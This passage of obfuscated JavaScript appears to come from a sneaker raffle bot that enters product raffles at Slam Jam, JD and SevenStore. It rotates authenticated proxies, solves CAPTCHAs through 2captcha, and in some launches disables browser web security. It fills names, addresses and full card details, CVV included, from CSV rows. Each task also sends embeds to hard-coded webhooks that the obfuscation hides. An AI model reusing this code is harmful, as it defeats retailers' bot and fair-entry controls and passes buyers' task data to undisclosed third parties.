                'timeout': 0xea60
            }), await _0x29ac01(0xbb8), console['log'](_0x91a29b() + '\x20[' + _0x10f948['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x5dfa0a['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
            await _0x5dfa0a['click']('.product-select-variant-wrapper'), await _0x29ac01(0x320), await _0x5dfa0a['click']('li.product-select-variant__value[data-size=\x22' + _0x4cf783[_0x3b2423]['Size'] + '\x22]'), await _0x29ac01(0x384), await _0x5dfa0a['$eval']('#AddToCartForm-product-template-raffle', _0x51447d => _0x51447d['submit']()), await _0x5dfa0a['waitForSelector']('.cart-order-summary__content'), await _0x29ac01(0x514), await _0x5dfa0a['goto']('https://drop.slamjam.com/checkout'), await _0x29ac01(0x514), await _0x5dfa0a['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x91a29b() + '\x20[' + _0x10f948['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5dfa0a['select']('#checkout_shipping_address_country', '' + _0x4cf783[_0x3b2423]['Country']), await _0x29ac01(0x200), await _0x5dfa0a['waitForSelector']('#checkout_shipping_address_first_name'), await _0x5dfa0a['type']('#checkout_shipping_address_first_name', '' + _0x4cf783[_0x3b2423]['FirstName']), await _0x29ac01(0x237), await _0x5dfa0a['type']('#checkout_shipping_address_last_name', '' + _0x4cf783[_0x3b2423]['LastName']), await _0x29ac01(0x1e0), await _0x5dfa0a['type']('#checkout_shipping_address_address1', _0x4cf783[_0x3b2423]['Address1'] + '\x20' + _0x4cf783[_0x3b2423]['HouseNumber']), await _0x29ac01(0x514), await _0x5dfa0a['type']('#checkout_shipping_address_address2', '' + _0x4cf783[_0x3b2423]['Address2']), await _0x29ac01(0x514);
            _0x4cf783[_0x3b2423]['Postcode'] == undefined && (_0x4cf783[_0x3b2423]['Postcode'] = _0x4cf783[_0x3b2423]['Zip']);
            await _0x5dfa0a['type']('#checkout_shipping_address_zip', '' + _0x4cf783[_0x3b2423]['Postcode']), await _0x29ac01(0x2bc), await _0x5dfa0a['type']('#checkout_shipping_address_city', '' + _0x4cf783[_0x3b2423]['City']), await _0x29ac01(0x320), await _0x5dfa0a['type']('#checkout_shipping_address_phone', '' + _0x4cf783[_0x3b2423]['Phone']), await _0x29ac01(0x320), await _0x5dfa0a['click']('#continue_button'), await _0x29ac01(0xbb8), await _0x5dfa0a['waitForSelector']('.summary-title'), await _0x29ac01(0x320), await _0x5dfa0a['click']('#continue_button'), await _0x29ac01(0x320), console['log'](_0x91a29b() + '\x20[' + _0x10f948['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x5dfa0a['waitForSelector']('#checkout_credit_card_vault'), await _0x29ac01(0x3e8);
            var _0x5f5834 = await _0x5dfa0a['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x12579b = await _0x5f5834['contentFrame']();
            await _0x12579b['click']('#number'), await _0x29ac01(0x3e8), await _0x12579b['type']('#number', '' + _0x4cf783[_0x3b2423]['CardNumber'], { 'delay': 0x78 }), _0x5f5834 = await _0x5dfa0a['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x12579b = await _0x5f5834['contentFrame'](), await _0x29ac01(0x1c2), await _0x12579b['click']('#name'), await _0x29ac01(0x1f4), await _0x12579b['type']('#name', '' + _0x4cf783[_0x3b2423]['NameOnCard'], { 'delay': 0x78 }), _0x5f5834 = await _0x5dfa0a['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x12579b = await _0x5f5834['contentFrame'](), await _0x29ac01(0x1c2), await _0x12579b['click']('#expiry'), await _0x29ac01(0x1f4), await _0x12579b['type']('#expiry', '' + _0x4cf783[_0x3b2423]['ExpiryDate'], { 'delay': 0x78 }), _0x5f5834 = await _0x5dfa0a['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x12579b = await _0x5f5834['contentFrame'](), await _0x29ac01(0x1c2), await _0x12579b['click']('#verification_value'), await _0x29ac01(0x1f4), await _0x12579b['type']('#verification_value', '' + _0x4cf783[_0x3b2423]['CVV'], { 'delay': 0x78 }), await _0x5dfa0a['$eval']('#accepts-flag-raffle', _0x3b604e => _0x3b604e['click']()), await _0x29ac01(0x7d0), console['log'](_0x91a29b() + '\x20[' + _0x10f948['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x5dfa0a['$eval']('#continue_button', _0x8052dd => _0x8052dd['click']()), await _0x29ac01(0x1b58), await _0x5dfa0a['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x5dfa0a['$eval']('.edit_checkout.animate-floating-labels', _0x41a057 => _0x41a057['submit']()), await _0x29ac01(0x7d0);
            try {
                await _0x5dfa0a['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x1a303a = 'no', _0x4cb72b(_0x4cf783[_0x3b2423], _0x10f948), console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x10f948['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x35ea72) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x35ea72['message']);
            }
            var _0x10bca7 = await _0x2463d6(_0x4cf783[_0x3b2423], _0x10f948, 'dev', ![]), _0xb17680 = await _0x2463d6(_0x4cf783[_0x3b2423], _0x10f948, 'pub', ![]);
            const _0x2c1004 = {
                'succesDEVMSG': { 'embeds': [_0x10bca7] },
                'succesPUBMSG': { 'embeds': [_0xb17680] }
            };
            try {
                _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x2c1004['succesDEVMSG']), await _0x29ac01(0xc8), await _0x31fc49(_0x1bd5ed, _0x2c1004['succesDEVMSG']), await _0x29ac01(0xc8), await _0x31fc49(_0x5bae61, _0x2c1004['succesPUBMSG']);
            } catch (_0x4ada29) {
                console['log'](_0x3e6680['yellow'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4ada29));
            }
        } catch (_0xc66d8d) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20' + _0xc66d8d)), _0x43a42d = '' + _0xc66d8d;
            var _0x431fb9 = await _0x2463d6(kickz[_0x3b2423], _0x10f948, 'dev', !![], _0x43a42d);
            EMBEDS['errorDEV'] = { 'embeds': [_0x431fb9] }, _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], EMBEDS['errorDEV']), await _0x31fc49(_0x344612, EMBEDS['errorDEV']), _0x1a303a = 'yes';
        } finally {
            _0x49b53f && _0x49b53f['close']();
            if (_0x1a303a == 'yes' && _0x3eca25 != 0x5 && _0x43a42d != 'Size\x20Not\x20Found') {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x10f948['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20Retrying')), _0x3b2423 = _0x3b2423 - 0x1, _0x3eca25 = _0x3eca25 + 0x1;
                continue;
            }
            _0x1a303a == 'yes' && _0x3eca25 >= 0x5 && (_0x29520a(_0x4cf783[_0x3b2423], _0x10f948), _0x1a303a = 'no', _0x3eca25 = 0x0), console['log']('Waiting\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
        }
    }
}
async function _0x40ef40(_0x2d646b, _0x2c9d58, _0x17f712) {
    var _0x410edd = ![], _0x196f72 = ![];
    if (_0x2cde8d['captchaKey'] == '' || _0x2cde8d['captchaKey'] == undefined)
        return console['log'](_0x3e6680['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5a3591 = 0x0; _0x5a3591 < _0x2c9d58['length']; _0x5a3591++) {
        if (_0x5799c5 != 'yes')
            var _0x5799c5 = '', _0x4d7626 = 0x0;
        var _0x416550, _0x1fe2e7 = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x2c9d58[_0x5a3591]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2c9d58[_0x5a3591]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0xf76913
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x2cde8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x582dcf
                }
            ]
        }];
        const _0x459fa0 = { 'embeds': _0x1fe2e7 };
        _0x757e32(_0x2d646b['name'] + '\x20Task\x20' + (_0x5a3591 + 0x1) + '\x20/\x20' + _0x2c9d58['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83), await _0x43304e(_0x2c9d58, _0x5a3591);
        var _0x28b03e = await _0x2463d6(_0x2c9d58[_0x5a3591], _0x2d646b, 'dev', ![]), _0x355620 = await _0x2463d6(_0x2c9d58[_0x5a3591], _0x2d646b, 'pub', ![]);
        const _0x10632e = {
            'succesDEVMSG': { 'embeds': [_0x28b03e] },
            'succesPUBMSG': { 'embeds': [_0x355620] }
        };
        if (_0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '')
            try {
                await _0x31fc49(_0x2cde8d['webhook'], _0x10632e['succesDEVMSG']);
            } catch {
            }
        await _0x29ac01(0xc8), await _0x31fc49(_0x1bd5ed, _0x10632e['succesDEVMSG']), await _0x29ac01(0xc8);
        try {
            await _0x31fc49(_0x5bae61, _0x10632e['succesPUBMSG']);
        } catch {
        }
        if (_0x2c9d58[_0x5a3591]['Email'] == '' || _0x2c9d58[_0x5a3591]['Url'] == '' || _0x2c9d58[_0x5a3591]['FirstName'] == '' || _0x2c9d58[_0x5a3591]['LastName'] == '') {
            console['log'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x5a3591 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x2cde8d['useRandomProxy'] = ![])
            var _0x29640b = _0x17f712[_0x5a3591]['split'](':');
        else
            var _0x56b77f = Math['round'](Math['random']() * (_0x17f712['length'] - 0x1)), _0x29640b = _0x17f712[_0x56b77f]['split'](':');
        const _0x33e32d = await _0x149082['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x29640b[0x0] + ':' + _0x29640b[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x3cb1ab = await _0x33e32d['newPage']();
            await _0x3cb1ab['authenticate']({
                'username': '' + _0x29640b[0x2],
                'password': '' + _0x29640b[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x2d646b['name'] + ']\x20Task\x20' + (_0x5a3591 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3cb1ab['setRequestInterception'](!![]), _0x3cb1ab['on']('request', _0x5c1cc0 => {
                _0x5c1cc0['resourceType']() === 'image' || _0x5c1cc0['resourceType']() === 'font' || _0x5c1cc0['resourceType']() === 'media' ? _0x5c1cc0['abort']() : _0x5c1cc0['continue']();
            }), await _0x3cb1ab['goto']('' + _0x2c9d58[_0x5a3591]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0x3cb1ab['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
            console['log'](_0x91a29b() + '\x20[' + _0x2d646b['name'] + ']\x20Task\x20' + (_0x5a3591 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3cb1ab['type']('#comp_firstname', '' + _0x2c9d58[_0x5a3591]['FirstName']), await _0x3cb1ab['waitForSelector']('#comp_lastname'), await _0x3cb1ab['type']('#comp_lastname', '' + _0x2c9d58[_0x5a3591]['LastName']), await _0x3cb1ab['waitForSelector']('#comp_email'), await _0x3cb1ab['type']('#comp_email', '' + _0x2c9d58[_0x5a3591]['Email']), await _0x3cb1ab['waitForSelector']('#comp_paypalemail'), await _0x3cb1ab['type']('#comp_paypalemail', '' + _0x2c9d58[_0x5a3591]['Email']), await _0x3cb1ab['waitForSelector']('#comp_mobile_end'), await _0x3cb1ab['type']('#comp_mobile_end', '' + _0x2c9d58[_0x5a3591]['Phone']), await _0x3cb1ab['waitForSelector']('#comp_dob'), await _0x3cb1ab['type']('#comp_dob', '08/09/1992'), console['log'](_0x91a29b() + '\x20[' + _0x2d646b['name'] + ']\x20Task\x20' + (_0x5a3591 + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x2c9d58[_0x5a3591]['Size'] == 'RANDOM') {
                const _0x25e516 = await _0x3cb1ab['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x561713 => {
                    return _0x561713['map'](_0x57e5b1 => _0x57e5b1['value']);
                });
                var _0x2d26f4 = Math['round'](Math['random']() * (_0x25e516['length'] - 0x2));
                await _0x3cb1ab['select']('#shoesize', _0x25e516[_0x2d26f4 + 0x1]), await _0x29ac01(0x3e8);
            } else {
                const _0x16d7d6 = await _0x3cb1ab['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x1b90cb => {
                    return _0x1b90cb['map'](_0x594f65 => _0x594f65['innerText']);
                }), _0x14135e = await _0x3cb1ab['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x45a445 => {
                    return _0x45a445['map'](_0x34818a => _0x34818a['value']);
                });
                var _0x1c5d6a = _0x2c9d58[_0x5a3591]['Size'];
                for (var _0x4c2112 = 0x1; _0x4c2112 < _0x14135e['length']; _0x4c2112++) {
                    var _0x3ce68e = _0x16d7d6[_0x4c2112]['split']('\x20')[0x0];
                    if (_0x3ce68e == _0x1c5d6a) {
                        await _0x3cb1ab['select']('#shoesize', _0x14135e[_0x4c2112]);
                        break;
                    } else {
                        if (_0x4c2112 + 0x1 == _0x14135e['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0x3cb1ab['waitForSelector']('#comp_address1'), await _0x3cb1ab['type']('#comp_address1', _0x2c9d58[_0x5a3591]['Address1'] + '\x20' + _0x2c9d58[_0x5a3591]['HouseNumber']), await _0x3cb1ab['waitForSelector']('#comp_address2'), await _0x3cb1ab['type']('#comp_address2', '' + _0x2c9d58[_0x5a3591]['Address2']), await _0x3cb1ab['waitForSelector']('#comp_address2'), await _0x3cb1ab['type']('#comp_address3', '' + _0x2c9d58[_0x5a3591]['City']), await _0x3cb1ab['waitForSelector']('#comp_postcode'), await _0x3cb1ab['type']('#comp_postcode', '' + _0x2c9d58[_0x5a3591]['Zip']), console['log'](_0x91a29b() + '\x20[' + _0x2d646b['name'] + ']\x20Task\x20' + (_0x5a3591 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x29ac01(0x4b0), await _0x3cb1ab['click']('label#emailhold'), await _0x29ac01(0x5dc), await _0x3cb1ab['click']('#preauth_tandc_email\x20>\x20label'), await _0x29ac01(0x5dc), await _0x3cb1ab['click']('#submit'), await _0x3cb1ab['waitForSelector']('#paymentWrap'), console['log'](_0x91a29b() + '\x20[' + _0x2d646b['name'] + ']\x20Task\x20' + (_0x5a3591 + 0x1) + '\x20:\x20' + _0x3e6680['blue']('Awaiting\x20Paypal\x20Payment')), _0x33e32d['on']('targetcreated', async _0x4030d5 => {
                if (_0x4030d5['type']() === 'page') {
                    const _0xc48313 = await _0x4030d5['page']();
                    async function _0x98901a() {
                        try {
                            await _0x3cb1ab['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x196f72 = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x502fa0() {
                        try {
                            await _0x3cb1ab['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x410edd = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x502fa0(), _0x98901a(), await _0x29ac01(0x493e0);
                }
            });
            async function _0x4eda24() {
                for (let _0x316f3e = 0x0; _0x316f3e < 0x12c; _0x316f3e++) {
                    if (_0x410edd == !![]) {
                        _0x5799c5 = 'no', _0x4cb72b(_0x2c9d58[_0x5a3591], _0x2d646b), console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x2d646b['name'] + ']\x20Task\x20' + (_0x5a3591 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '')
                            try {
                                await _0x31fc49(_0x2cde8d['webhook'], _0x10632e['succesDEVMSG']);
                            } catch {
                            }
                        await _0x29ac01(0xc8), await _0x31fc49(_0x1bd5ed, _0x10632e['succesDEVMSG']), await _0x29ac01(0xc8);
                        try {
                            await _0x31fc49(_0x5bae61, _0x10632e['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x196f72)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x29ac01(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x29ac01(0xbb8), await _0x3cb1ab['click']('.zoid-outlet'), await _0x29ac01(0x7d0), await _0x4eda24();
        } catch (_0x44ddf0) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x2d646b['name'] + ']\x20Task\x20' + (_0x5a3591 + 0x1) + '\x20:\x20' + _0x44ddf0)), _0x416550 = '' + _0x44ddf0;
            var _0x34125d = await _0x2463d6(_0x2c9d58[_0x5a3591], _0x2d646b, 'dev', !![], _0x416550);
            _0x10632e['errorDEV'] = { 'embeds': [_0x34125d] }, _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x10632e['errorDEV']), await _0x31fc49(_0x344612, _0x10632e['errorDEV']);
        } finally {
            _0x33e32d && _0x33e32d['close']();
            if (_0x5799c5 == 'yes' && _0x4d7626 != 0x5 && _0x416550 != 'Size\x20Not\x20Found') {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x2d646b['name'] + ']\x20Task\x20' + (_0x5a3591 + 0x1) + '\x20:\x20Retrying')), _0x5a3591 = _0x5a3591 - 0x1, _0x4d7626 = _0x4d7626 + 0x1;
                continue;
            }
            _0x5799c5 == 'yes' && _0x4d7626 >= 0x5 && (_0x29520a(afew[_0x5a3591], _0x2d646b), _0x5799c5 = 'no', _0x4d7626 = 0x0), console['log']('Waiting\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
        }
    }
}
async function _0x2b96d4(_0x101e86, _0x3485a7, _0x447c45) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4c75cf = 0x0; _0x4c75cf < _0x3485a7['length']; _0x4c75cf++) {
        _0x757e32(_0x101e86['name'] + '\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20/\x20' + _0x3485a7['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83);
        var _0x1acd92 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0xf76913
                },
                {
                    'name': 'Product',
                    'value': '' + _0x3485a7[_0x4c75cf]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x3485a7[_0x4c75cf]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x2cde8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x2cde8d['version']
                }
            ]
        }];
        const _0x2122a1 = { 'embeds': _0x1acd92 };
        await _0x43304e(_0x3485a7, _0x4c75cf);
        if (_0x3485a7[_0x4c75cf]['Email'] == '' || _0x3485a7[_0x4c75cf]['Password'] == '' || _0x3485a7[_0x4c75cf]['FirstName'] == '' || _0x3485a7[_0x4c75cf]['LastName'] == '') {
            console['log'](_0x91a29b() + '\x20[' + _0x101e86['name'] + ']\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x3485a7[_0x4c75cf]['Password'] == '' || _0x3485a7[_0x4c75cf]['Password'] == undefined) && (_0x3485a7[_0x4c75cf]['Password'] = 'ErehsaWonRaj1!');
        if (_0x2cde8d['useRandomProxy'] = ![])
            var _0x3705c9 = _0x447c45[_0x4c75cf]['split'](':');
        else
            var _0x30056a = Math['round'](Math['random']() * (_0x447c45['length'] - 0x1)), _0x3705c9 = _0x447c45[_0x30056a]['split'](':');
        const _0xfec986 = await _0x149082['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3705c9[0x0] + ':' + _0x3705c9[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1763a3 = await _0xfec986['newPage']();
            await _0x1763a3['authenticate']({
                'username': '' + _0x3705c9[0x2],
                'password': '' + _0x3705c9[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x101e86['name'] + ']\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1763a3['setRequestInterception'](!![]), _0x1763a3['on']('request', _0x3604fd => {
                _0x3604fd['resourceType']() === 'image' || _0x3604fd['resourceType']() === 'font' || _0x3604fd['resourceType']() === 'media' ? _0x3604fd['abort']() : _0x3604fd['continue']();
            }), await _0x1763a3['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x1763a3['goto']('' + _0x3485a7[_0x4c75cf]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x1763a3['waitForSelector']('#btnPdpAtb'), console['log'](_0x91a29b() + '\x20[' + _0x101e86['name'] + ']\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x3485a7[_0x4c75cf]['Size']);
            const _0x22e7dc = await _0x1763a3['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x3d1fd7 => {
                return _0x3d1fd7['map'](_0x4f7883 => _0x4f7883['innerText']);
            }), _0x2d653a = await _0x1763a3['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x554326 = ![];
            if (_0x3485a7[_0x4c75cf]['Size'] == 'RANDOM') {
                var _0xc266ce = Math['round'](Math['random']() * (_0x2d653a['length'] - 0x1));
                await _0x2d653a[_0xc266ce]['click']();
            } else
                for (var _0x46d4ca = 0x0; _0x46d4ca < _0x22e7dc['length']; _0x46d4ca++) {
                    if (_0x22e7dc[_0x46d4ca] != _0x3485a7[_0x4c75cf]['Size'])
                        continue;
                    try {
                        await _0x2d653a[_0x46d4ca]['click']();
                    } catch {
                        console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x101e86['name'] + ']\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x554326 = !![];
                    }
                }
            if (_0x554326)
                continue;
            await _0x29ac01(0x578), await _0x1763a3['click']('#btnPdpAtb'), await _0x1763a3['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x29ac01(0x3e8), console['log'](_0x91a29b() + '\x20[' + _0x101e86['name'] + ']\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x1763a3['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x1763a3['waitForSelector']('#email'), await _0x1763a3['type']('#email', _0x3485a7[_0x4c75cf]['Email']), await _0x29ac01(0x226), await _0x1763a3['click']('#guest-submit'), await _0x29ac01(0x1b58), console['log'](_0x91a29b() + '\x20[' + _0x101e86['name'] + ']\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1763a3['waitForSelector']('#firstname'), await _0x1763a3['type']('#firstname', _0x3485a7[_0x4c75cf]['FirstName'], 0x1f4), await _0x29ac01(0x190), await _0x1763a3['waitForSelector']('#surname'), await _0x1763a3['type']('#surname', _0x3485a7[_0x4c75cf]['LastName'], 0x1f4), await _0x29ac01(0x190), await _0x1763a3['waitForSelector']('#mobile'), await _0x1763a3['type']('#mobile', _0x3485a7[_0x4c75cf]['Phone'], 0x1f4), await _0x29ac01(0x190), await _0x1763a3['click']('#enterManualDiv'), await _0x29ac01(0x5dc), await _0x1763a3['waitForSelector']('#address1'), await _0x1763a3['type']('#address1', _0x3485a7[_0x4c75cf]['Address1'] + '\x20' + _0x3485a7[_0x4c75cf]['HouseNumber'], 0x226), await _0x29ac01(0x384), await _0x1763a3['waitForSelector']('#address2'), await _0x1763a3['type']('#address2', '' + _0x3485a7[_0x4c75cf]['Address2'], 0x226), await _0x29ac01(0x320);
            const _0x15c2f5 = await _0x1763a3['$$eval']('#countryselect_view3\x20>\x20option', _0x1c0df6 => {
                return _0x1c0df6['map'](_0xfb7ffb => _0xfb7ffb['value']);
            });
            var _0x3c8dc3;
            for (var _0x25bdc5 = 0x0; _0x25bdc5 < _0x15c2f5['length']; _0x25bdc5++) {
                if (_0x15c2f5[_0x25bdc5]['startsWith']('' + _0x3485a7[_0x4c75cf]['Country'])) {
                    _0x3c8dc3 = _0x15c2f5[_0x25bdc5];
                    break;
                }
                continue;
            }
            await _0x1763a3['select']('#countryselect_view3', '' + _0x3c8dc3), await _0x1763a3['waitForSelector']('#address4'), await _0x1763a3['type']('#address4', '' + _0x3485a7[_0x4c75cf]['City'], 0x1f4), await _0x29ac01(0x384), await _0x1763a3['waitForSelector']('#postcode'), await _0x1763a3['type']('#postcode', '' + _0x3485a7[_0x4c75cf]['Zip'], 0x1f4), await _0x29ac01(0x4b0);
            const _0x19567c = await _0x1763a3['url']();
            console['log'](_0x91a29b() + '\x20[' + _0x101e86['name'] + ']\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x2995e0 = _0x19567c['split']('?')[0x1], _0x33a06f = await _0x1763a3['$']('#co_address_submit');
            await _0x33a06f['evaluate'](_0x4879e9 => _0x4879e9['click']()), await _0x29ac01(0x1388), await _0x1763a3['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x2995e0), console['log'](_0x91a29b() + '\x20[' + _0x101e86['name'] + ']\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x1763a3['waitForSelector']('#paymentbuttons'), await _0x29ac01(0x1388), await _0x1763a3['click']('#paymentbuttons\x20>\x20div'), await _0x29ac01(0x1c2), await _0x1763a3['waitForSelector']('#card-number'), await _0x1763a3['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x40ea2b = await _0x1763a3['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x2c69bb = await _0x40ea2b['contentFrame']();
            await _0x2c69bb['waitForSelector']('.InputContainer'), await _0x2c69bb['click']('.InputContainer\x20>\x20input'), await _0x29ac01(0x578), await _0x1763a3['type']('#card-number', '' + _0x3485a7[_0x4c75cf]['CreditNumber']), await _0x29ac01(0xfa), await _0x1763a3['type']('#card-expiry', '' + _0x3485a7[_0x4c75cf]['ExpiryDate']), await _0x29ac01(0xfa), await _0x1763a3['type']('#card-cvc', '' + _0x3485a7[_0x4c75cf]['CVV']), await _0x29ac01(0x7d0), await _0x1763a3['click']('#card-button'), console['log'](_0x91a29b() + '\x20[' + _0x101e86['name'] + ']\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x1763a3['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x101e86['name'] + ']\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x31fc49(_0x1bd5ed, _0x2122a1);
            } catch {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x101e86['name'] + ']\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20:\x203DS\x20Failed')), _0x1acd92[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x1acd92[0x0]['description'] = '3DS\x20Failed', await _0x31fc49(_0x344612, _0x2122a1);
            }
        } catch (_0x5e744f) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x101e86['name'] + ']\x20Task\x20' + (_0x4c75cf + 0x1) + '\x20:\x20' + _0x5e744f)), _0x1acd92[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x1acd92[0x0]['description'] = '' + _0x5e744f, await _0x31fc49(_0x344612, _0x2122a1);
        } finally {
            _0xfec986 && _0xfec986['close']();
            if (_0x4c75cf + 0x1 == _0x3485a7['length']) {
                console['log'](_0x3e6680['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x29ac01(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x2cde8d['AfewDelay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['AfewDelay']);
        }
    }
}
